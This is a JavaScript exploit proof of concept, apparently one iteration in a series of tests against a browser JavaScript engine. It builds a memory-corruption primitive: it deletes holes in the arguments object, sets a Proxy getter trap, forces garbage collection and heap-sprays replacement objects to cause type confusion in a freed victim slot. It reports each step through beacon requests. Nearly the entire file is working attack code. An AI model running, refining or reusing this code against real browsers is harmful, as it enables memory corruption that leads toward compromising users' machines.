// p284 - Isolated victim creation + late slot type confusion
//
// Enhancement over p280: creates victim in an isolated function
// whose stack frame is fully unwound before the trap fires.
// Uses stackWash to overwrite dead stack data.
// Double hole at slots 3 and 5 for redundancy.
// Victim at slot 50 (well after holes).
//
// Also tests: what does WeakRef show? If victim alive despite
// no JS refs and no new-butterfly refs, something else pins it.
//
// Beacon prefix: V284-

(function() {
  function B(tag, body) {
    var url = '/beacon/V284-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  var VICTIM_SLOT = 50;
  var HOLES = [3, 5];
  var N = 64;

  function stackWash(depth) {
    var junk = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16];
    if (depth > 0) return stackWash(depth - 1) + junk.length;
    return junk.length;
  }

  function buildArgs(round) {
    var v = {
      victimA: 0xAAAA0000 + round,
      victimB: 0xBBBB0000 + round,
      pad1: 'VICTIM',
      pad2: 'DATA'
    };
    var wr;
    try { wr = new WeakRef(v); } catch(e) { wr = null; }

    var arr = [];
    for (var i = 0; i < N; i++) {
      if (i === VICTIM_SLOT || i === VICTIM_SLOT + 1) arr.push(v);
      else arr.push(i + 1);
    }

    var args = target.apply(null, arr);
    for (var h = 0; h < HOLES.length; h++) {
      delete args[HOLES[h]];
    }

    arr[VICTIM_SLOT] = null;
    arr[VICTIM_SLOT + 1] = null;
    arr = null;
    v = null;

    return {args: args, wr: wr};
  }

  function attempt(round) {
    var setup = buildArgs(round);
    var args = setup.args;
    var victimWR = setup.wr;

    stackWash(60);

    if (victimWR) {
      var preCheck = victimWR.deref();
      B('R' + round + '-PRE-' + (preCheck ? 'ALIVE' : 'DEAD'));
      preCheck = null;
    }

    var trapCount = 0;
    var sprayObjs = [];
    var gcCollected = false;

    var trap = {
      get: function(t, prop) {
        if (trapCount > 0) return 0xFACE;
        trapCount++;

        for (var j = 100; j < 800; j++) {
          args[j] = 0x41414141;
        }

        args[VICTIM_SLOT] = null;
        args[VICTIM_SLOT + 1] = null;

        stackWash(40);

        for (var g = 0; g < 100; g++) {
          var batch = [];
          for (var k = 0; k < 15000; k++) {
            batch.push({x: k, y: k + 1, z: String(k)});
          }
          batch = null;
        }

        if (victimWR) {
          var vCheck = victimWR.deref();
          if (!vCheck) {
            gcCollected = true;
            B('R' + round + '-COLLECTED');
          } else {
            B('R' + round + '-STILL-ALIVE');
          }
          vCheck = null;
        }

        sprayObjs = [];
        for (var s = 0; s < 12000; s++) {
          sprayObjs.push({
            sprayA: 0xC0FE0000 + (s & 0xFFFF),
            sprayB: 0xDEAD0000 + (s & 0xFFFF),
            pad1: 'SPRAY',
            pad2: 'REPL'
          });
        }
        B('R' + round + '-SPRAYED-' + sprayObjs.length);

        return 0xBEEF;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-ERR-' + e.message.substring(0, 40));
      return null;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return null; }

    var v50 = result[VICTIM_SLOT];
    var status;
    if (typeof v50 === 'object' && v50 !== null) {
      if (v50.sprayA !== undefined) {
        status = 'REPLACED';
        B('R' + round + '-REPLACED-' + hex((v50.sprayA >>> 0)));
        return {hit: true, obj: v50, round: round};
      } else if (v50.victimA !== undefined) {
        status = 'VICTIM-ALIVE';
      } else {
        status = 'UNKNOWN-OBJ';
        try { B('R' + round + '-KEYS-' + Object.keys(v50).join(',')); } catch(e) {}
      }
    } else if (v50 === null || v50 === undefined) {
      status = 'NULL-' + (gcCollected ? 'GC' : 'NO');
    } else if (typeof v50 === 'number') {
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = v50;
      var dv = new DataView(buf);
      status = 'NUM-' + hex(dv.getUint32(4, false)) + hex(dv.getUint32(0, false));
    } else {
      status = 'TYPE-' + typeof v50;
    }
    B('R' + round + '-S50-' + status);

    for (var h = 0; h < HOLES.length; h++) {
      var hv = result[HOLES[h]];
      if (typeof hv === 'number') B('R' + round + '-H' + HOLES[h] + '-' + hex(hv >>> 0));
    }

    if (victimWR) {
      var postCheck = victimWR.deref();
      B('R' + round + '-POST-' + (postCheck ? 'ALIVE' : 'DEAD'));
    }

    return null;
  }

  var round = 0;
  function runNext() {
    if (round >= 6) { B('DONE'); return; }
    var res = attempt(round);
    if (res && res.hit) {
      B('SUCCESS-R' + res.round);
      var o = res.obj;
      B('SPRAY-A-' + hex((o.sprayA || 0) >>> 0));
      B('SPRAY-B-' + hex((o.sprayB || 0) >>> 0));
      return;
    }
    round++;
    setTimeout(runNext, 200);
  }
  runNext();
})();
